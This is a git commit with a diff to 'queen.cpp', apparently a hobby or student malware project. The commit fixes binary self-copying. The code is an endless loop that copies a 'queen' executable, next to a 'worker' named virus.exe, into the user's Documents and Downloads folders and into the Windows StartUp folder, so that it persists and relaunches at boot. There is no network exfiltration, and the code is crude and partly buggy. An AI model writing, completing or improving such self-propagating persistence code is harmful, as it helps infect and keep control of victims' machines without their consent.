1ecf31ca72a5abf97d51abb043053e5b6f93fde3
Karl Lodholz <karllodholz@gmail.com>
2020-09-13 16:42:11 -0500

    copying files and file paths work properly now

--- queen.cpp
+++ queen.cpp
@@ -3,6 +3,8 @@
 #include <vector>
 #include <unistd.h> //F_OK and sleep
 
+
+
 bool exists (const std::string& name) {
     return ( access( name.c_str(), F_OK ) != -1 );
 }
@@ -11,6 +13,7 @@ int main() {
 
   const std::string WORKER_EGG_FILE_NAME = "virus.exe";
   const std::string QUEEN_EGG_FILE_NAME = "queen.exe";
+  const std::string QUEEN_INSTILATION_EGG_NAME = "queeenie.exe";
   const std::string USER = std::string(std::getenv("HOMEPATH")).substr((std::string(std::getenv("HOMEPATH") ).rfind("\\") ) + 1, (std::string(std::getenv("HOMEPATH")).length()-1) );
   const std::string WORKER_EXE_FILE_NAME = "virus.exe";
 
@@ -18,24 +21,27 @@ int main() {
   std::ofstream dst;
 
   //the last location will not be reinstalled
-  const std::vector<std::string> QUEEN_DEST = { "C:\\Users\\"+USER+"\\Documents\\","C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\","C:\\Users\\"+USER+"\\Downloads\\"};
+  const std::vector<std::string> QUEEN_DEST = { "C:\\Users\\"+USER+"\\Documents\\","C:\\ProgramData\\Microsoft\\Windows\\\"Start Menu\"\\Programs\\StartUp\\","C:\\Users\\"+USER+"\\Downloads\\"};
   const std::vector<std::string> WORKER_DEST = {"C:\\Users\\"+USER+"\\Documents\\","C:\\Users\\"+USER+"\\Downloads\\"};
+
+  char ch; //used for coping files
+
   for (;;) { //cursed while loop formating
     //finds first executable instance
-    int i;
-    while(i<QUEEN_DEST.size() && !exists(QUEEN_DEST[i]+QUEEN_EGG_FILE_NAME) ) ++i;
-    if(i==QUEEN_DEST.size()) {
+    bool bb = exists(QUEEN_DEST[QUEEN_DEST.size()-1]+QUEEN_INSTILATION_EGG_NAME);
+    int loc_idx = (bb ? QUEEN_DEST.size()-1 : 0);
+    while(loc_idx>0 && loc_idx<QUEEN_DEST.size() && !exists(QUEEN_DEST[loc_idx]+QUEEN_EGG_FILE_NAME) ) ++loc_idx;
+    if(loc_idx==QUEEN_DEST.size()) {
       std::cout<<"go download queen"<<std::endl;
       //put it in downloads and deciment i
     }
 
+    //duplication of exicutables is unsuccessful if executable is being run at the moment
     for(int j=0; j<QUEEN_DEST.size();j++) {
       if(!exists(QUEEN_DEST[j]+QUEEN_EGG_FILE_NAME)) {
-        std::cout<<QUEEN_DEST[j]+QUEEN_EGG_FILE_NAME<<std::endl;
-        std::cout<<QUEEN_DEST[i]+QUEEN_EGG_FILE_NAME<<std::endl;
-        src.open(QUEEN_DEST[i]+QUEEN_EGG_FILE_NAME);
-        dst.open(QUEEN_DEST[j]+QUEEN_EGG_FILE_NAME);
-        dst << src.rdbuf();
+        src.open( QUEEN_DEST[loc_idx]+ (bb && loc_idx == QUEEN_DEST.size()-1? QUEEN_INSTILATION_EGG_NAME : QUEEN_EGG_FILE_NAME ) , std::ios::in | std::ios::binary);
+        dst.open(QUEEN_DEST[j]+QUEEN_EGG_FILE_NAME, std::ios::out | std::ios::binary);
+        while(src.get(ch)) dst << ch;
         src.close();
         dst.close();
       }
@@ -46,4 +52,3 @@ int main() {
   }
   return 0;
 }
-
